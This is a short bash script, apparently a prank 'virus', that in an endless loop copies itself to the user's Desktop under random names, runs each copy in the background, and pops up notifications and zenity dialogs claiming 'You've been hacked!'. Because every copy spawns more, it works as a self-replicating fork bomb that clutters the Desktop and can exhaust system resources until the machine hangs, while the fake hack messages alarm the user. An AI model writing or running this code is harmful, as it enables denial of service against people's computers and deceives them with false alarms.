#!/bin/bash

DESKTOP_DIR="$HOME/Desktop"

while true; do
    random_digit=$((RANDOM % 10))
    cp "$0" "$DESKTOP_DIR/${0##*/}_$random_digit.sh"
    bash "$DESKTOP_DIR/${0##*/}_$random_digit.sh" &
    notify-send "Critical error!"
    zenity --info --text="<span size=\"xx-large\">virus $(date +%Hh%M).</span>\n\nhacked <b>virus</b>." --title="You've been hacked!" --ok-label="close"
    sleep 1
done
